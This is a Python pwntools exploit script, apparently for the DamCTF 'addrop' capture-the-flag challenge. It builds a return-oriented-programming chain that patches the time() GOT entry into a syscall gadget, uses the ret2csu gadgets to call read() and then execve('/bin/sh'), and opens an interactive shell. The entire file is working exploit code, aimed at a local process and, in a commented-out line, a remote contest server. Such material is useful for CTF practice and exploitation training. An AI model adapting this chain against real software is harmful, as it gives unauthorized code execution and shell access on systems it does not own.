from pwn import *
import time
elf = ELF("./addrop")
libc=elf.libc
context.binary=elf
target=process([elf.path])
#target=remote('chals.damctf.xyz',31227)
context.log_level='DEBUG'

def sla(string,val):
	target.sendlineafter(string,val)

def sa(string,val):
	target.sendafter(string,val)

gadget=0x00000000004007e8 #add dword ptr [rbp - 0x3d], ebx; ret
poprbp=0x0000000000400788
time_got=0x600e20
writeaddr=0x600f00
'''convert time() to syscall'''
payload="\x00"*0x40+p64(0x68)
payload+=p64(poprbp)
payload+=p64(time_got+0x3d)
payload+=p64(gadget)
'''set registers for read(0,writeaddr,0x3b) via syscall'''
payload+=p64(0x4009aa)#csu1
payload+=p64(0)#rbx
payload+=p64(1)#bogus rbp	
payload+=p64(time_got)#r12
payload+=p64(0)#r13=rdi
payload+=p64(writeaddr)#r14=rsi
payload+=p64(0x3b)#r15=rdx
'''trigger read() call and set registers for execve("/bin/sh\x00",0,0) via syscall'''
payload+=p64(0x400990)#csu2
payload+=p64(0)#bogus rbp
payload+=p64(0x4009ac)#csu1
payload+=p64(time_got)#r12
payload+=p64(writeaddr)#r13=rdi
payload+=p64(0)#r14=rsi
payload+=p64(0)#r15=rdx
payload+=p64(0x400990)#csu2
pause()
sla("memfrob?\n",payload)
target.recvuntil("no leaks 4 u.\n")
time.sleep(1)
payload="/bin/sh".ljust(0x3b,"\x00")
target.send(payload)
#time.sleep(1)
#target.sendline("ls >&3")
target.interactive()
